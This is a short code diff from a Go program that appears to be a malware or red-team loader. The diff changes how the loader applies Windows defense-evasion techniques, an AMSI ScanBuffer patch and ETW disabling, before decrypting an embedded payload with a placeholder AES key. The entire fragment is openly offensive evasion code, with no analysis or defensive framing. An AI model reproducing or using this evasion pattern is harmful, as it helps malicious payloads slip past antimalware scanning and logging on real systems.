@@ -181,10 +181,10 @@ func main() {
     defer caller.Close()
 
     // 2. Apply evasion techniques through the same caller
-    evasion.Apply(caller,
-        amsi.Technique(),
-        etw.Technique(),
-    )
+    evasion.ApplyAll([]evasion.Technique{
+        amsi.ScanBufferPatch(),
+        etw.All(),
+    }, caller)
 
     // 3. Decrypt payload
     key := []byte("your-32-byte-AES-key-here!!!!!!")
